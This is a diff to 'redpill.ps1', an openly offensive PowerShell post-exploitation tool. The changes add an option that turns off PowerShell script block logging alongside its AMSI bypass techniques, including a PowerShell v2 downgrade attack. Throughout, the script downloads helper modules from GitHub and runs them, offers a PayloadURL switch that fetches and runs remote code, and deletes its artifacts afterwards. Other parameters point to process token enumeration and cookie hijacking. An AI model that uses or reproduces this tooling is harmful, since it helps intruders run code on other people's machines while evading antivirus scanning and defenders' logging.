@@ -94,6 +94,7 @@
    [string]$GetCounterMeasures="false",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
+   [string]$ScriptBlockLogging="ON",
    [string]$CookieHijack="False",
    [string]$UserAccount="false",
    [string]$PayloadURL="false",
@@ -503,16 +504,15 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tok
       Enum ALL user process tokens and queries them for details
 
    .OUTPUTS
-      Id              : 5684
-      Name            : powershell
-      Description     : Windows PowerShell
-      MainWindowTitle : @redpill v1.2.6 {SSA@RedTeam}
-      ProductVersion  : 10.0.18362.1
-      Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-      Company         : Microsoft Corporation
-      StartTime       : 29/01/2021 20:09:57
-      HasExited       : False
-      Responding      : True
+      Id Name                  ProductVersion    StartTime            Description
+      -- ----                  --------------    ---------            ----------- 
+      8524 ACMON                 1, 0, 0, 0        17/07/2021 22:01:19  ACMON                                      
+      1724 ApplicationFrameHost  10.0.19041.746    17/07/2021 21:59:30  Application Frame Host                     
+      7904 AsusTPLoader          1.0.51.0          17/07/2021 21:59:12  ASUS Smart Gesture Loader
+      5092 dllhost               10.0.19041.546    17/07/2021 21:58:53  COM Surrogate
+      9300 HxOutlook             16.0.13426.20910  17/07/2021 23:01:51  Microsoft Outlook
+      4416 WinStore.App          0.0.0.0           17/07/2021 22:02:51  Store 
+      6272 YourPhone             1.21052.124.0     17/07/2021 21:58:36  YourPhone
    #>
 
    ## Download GetProcess.ps1 from my GitHub
@@ -520,7 +520,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tok
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,8876953125/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,787109375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -531,7 +531,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tok
    If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){
       powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum
    }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){
-      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum -ProcessName $ProcessName
+      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum -ProcessName $ProcessName -Verb $Verb
    }ElseIf($GetProcess -ieq "Kill"){
       powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess kill -ProcessName $ProcessName
    }ElseIf($GetProcess -ieq "Tokens"){
@@ -540,6 +540,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tok
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
+   If(Test-Path -Path "$Env:TMP\Get-OSTokenInformation.ps1"){Remove-Item -Path "$Env:TMP\Get-OSTokenInformation.ps1" -Force}
 }
 
 If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"){
@@ -657,7 +658,7 @@ If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,740234375/KB
+      If($SizeDump -lt 28){## Corrupted download detected => DefaultFileSize: 28,755859375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3182,10 +3183,14 @@ If($NoAmsi -ne "false"){
    all available bypasses and aborts at the first successfull bypass.
 
 .Parameter NoAmsi
-   Accepts arguments: list, testall, bypass (default: bypass)
+   Accepts arguments: list, testall, bypass, Scriptlogging (default: bypass)
 
 .Parameter Id
   The technic Id to use for am`si_bypass (default: 2)  
+
+.EXAMPLE
+   PS C:\> .\NoAmsi.ps1 -Action Scriptlogging
+   Just disable PS ScriptBlockLogging in current shell!
 
 .EXAMPLE
    PS C:\> .\redpill.ps1 -NoAmsi List
@@ -3206,7 +3211,7 @@ If($NoAmsi -ne "false"){
    bypass      : Success
    Disclosure  : @nullbyte
    Description : PS_DOWNG`RADE_ATT`ACK
-   POC         : Execute: Get-Host
+   POC         : Execute: powershell -version 2 -C Get-Host
    Remark      : Execute 'exit' to return to PSv5 console!
 
    Id          : 2
@@ -3243,7 +3248,7 @@ If($NoAmsi -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 41){## Corrupted download detected => DefaultFileSize: 41,7333984375/KB
+      If($SizeDump -lt 41){## Corrupted download detected => DefaultFileSize: 41,9384765625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3263,7 +3268,7 @@ If($NoAmsi -ne "false"){
    ElseIf($NoAmsi -ieq "TestAll")
    {
       ## &"<script>" allows me to run NoAmsi on redpill process
-      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi
+      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -ScriptBlockLogging $ScriptBlockLogging
    }
    ElseIf($NoAmsi -ieq "Bypass")
    {
@@ -3271,13 +3276,13 @@ If($NoAmsi -ne "false"){
       {
          If($Id -eq "false"){$Id = "2"}
          ## &"<script>" allows me to run NoAmsi on redpill process
-         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -PayloadURL "$PayloadURL" -Id $Id      
+         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -PayloadURL "$PayloadURL" -Id $Id -ScriptBlockLogging $ScriptBlockLogging 
       }
       Else
       {
          If($Id -eq "false"){$Id = "2"}
          ## &"<script>" allows me to run NoAmsi on redpill process
-         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
+         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id -ScriptBlockLogging $ScriptBlockLogging
       }
    }
    Else
@@ -3288,7 +3293,6 @@ If($NoAmsi -ne "false"){
 
    ## Clean Artifacts left behind
    If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
-   If(Test-Path -Path "$pwd\localbrute.state"){Remove-Item -Path "$pwd\localbrute.state" -Force}
 }
 
 
@@ -3462,20 +3466,28 @@ $HelpParameters = @"
 
    .NOTES
       -GetProcess 'Tokens' @argument requires Admin privileges
+      -GetProcess 'Enum' excludes from query 'Idle,svchost,RunTimeBroker' 
 
    .Parameter GetProcess
       Accepts arguments: Enum, Kill and Tokens (default: Enum)
 
    .Parameter ProcessName
-      Accepts the process name to be query or kill (default: WinDefend)
+      The Process name to query or kill (default: false)
+
+   .Parameter Verb
+      Display process loaded dll's modules! (default: false)
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Enum
-      Enumerate ALL Remote Host Running Process(s)
+      Enumerate ALL Remote Host Running Processes
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox.exe
-      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
+      Enumerate firefox { Id,Name,ProcessName,Description,StartTime,Version,Path,.. }
+
+   .EXAMPLE
+      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox -Verb True
+      Enumerate ALL instances of firefox process and loaded dll's modules!
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
@@ -3486,16 +3498,15 @@ $HelpParameters = @"
       Enum ALL user process tokens and queries them for details
 
    .OUTPUTS
-      Id              : 5684
-      Name            : powershell
-      Description     : Windows PowerShell
-      MainWindowTitle : @redpill v1.2.6 {SSA@RedTeam}
-      ProductVersion  : 10.0.18362.1
-      Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-      Company         : Microsoft Corporation
-      StartTime       : 29/01/2021 20:09:57
-      HasExited       : False
-      Responding      : True
+      Id   Name                  ProductVersion    StartTime            Description
+      --   ----                  --------------    ---------            ----------- 
+      8524 ACMON                 1, 0, 0, 0        17/07/2021 22:01:19  ACMON                                      
+      1724 ApplicationFrameHost  10.0.19041.746    17/07/2021 21:59:30  Application Frame Host                     
+      7904 AsusTPLoader          1.0.51.0          17/07/2021 21:59:12  ASUS Smart Gesture Loader
+      5092 dllhost               10.0.19041.546    17/07/2021 21:58:53  COM Surrogate
+      9300 HxOutlook             16.0.13426.20910  17/07/2021 23:01:51  Microsoft Outlook
+      4416 WinStore.App          0.0.0.0           17/07/2021 22:02:51  Store 
+      6272 YourPhone             1.21052.124.0     17/07/2021 21:58:36  YourPhone
    #>!bye..
 
 "@;
@@ -5217,6 +5228,9 @@ $HelpParameters = @"
    .Parameter PSargs
       The cmdlet to be downloaded\exec argument list (default: false)
 
+   .Parameter ScriptBlockLogging
+      Accepts arguments: ON, OFF (default: ON)
+
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi List
       List ALL cmdlet Am`si_bypasses available!
@@ -5228,6 +5242,10 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 5
       Execute Am`si_bypass technic nº5 on current shell!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 2 -ScriptBlockLogging OFF
+      Execute Amsi_bypass technic nº2 and Disable PS ScriptBlockLogging!
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
